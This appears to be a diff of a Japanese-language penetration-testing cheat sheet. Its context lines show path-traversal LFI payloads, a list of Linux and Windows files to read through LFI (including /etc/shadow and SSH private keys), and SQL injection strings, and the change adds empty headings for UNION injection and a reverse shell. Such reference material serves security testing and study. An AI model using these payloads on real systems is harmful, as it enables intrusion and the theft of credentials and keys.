@@ -393,8 +393,8 @@ http://example.com/index.php?page=%252e%252e%252f
 http://example.com/index.php?page=....//....//etc/passwd
 ```
 
-LFIを利用して読み取りを狙うファイル:  
-* Linux
+#### LFIを利用して読み取りを狙うファイル:  
+Linux
 ```
 /etc/passwd
 /etc/shadow
@@ -405,11 +405,10 @@ LFIを利用して読み取りを狙うファイル:
 /etc/ssh/sshd_config
 /root/.ssh/id_rsa
 /root/.ssh/authorized_keys
-/home/user/.ssh/authorized_keys
-/home/user/.ssh/id_rsa
+/home/<username>/.ssh/authorized_keys
+/home/<username>/.ssh/id_rsa
 ```
-
-* Windows
+Windows
 ```
 /boot.ini
 /autoexec.bat
@@ -437,6 +436,10 @@ admin'/*
 ') or ('1'='1--
 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
 ```
+#### UNION injection
+
+#### SQLインジェクション→reverse shell
+
 
 SQLmap:
 ```
